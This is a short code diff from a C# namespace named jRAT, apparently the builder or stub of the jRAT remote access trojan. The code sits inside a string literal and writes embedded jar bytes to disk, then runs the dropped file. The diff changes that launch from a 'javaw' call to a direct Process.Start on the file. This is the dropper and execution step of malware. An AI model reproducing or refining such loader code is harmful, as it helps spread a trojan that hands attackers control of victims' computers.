@@ -46,7 +46,8 @@ namespace jRAT
                             System.IO.File.WriteAllBytes(s, jarbytes);
                         }
                         String quote = ""\"""";
-                        Process.Start(""javaw"", ""__PARGS__ "" + quote + s + quote);
+                        
+                        Process.Start(s);
                     }
             }
         }";
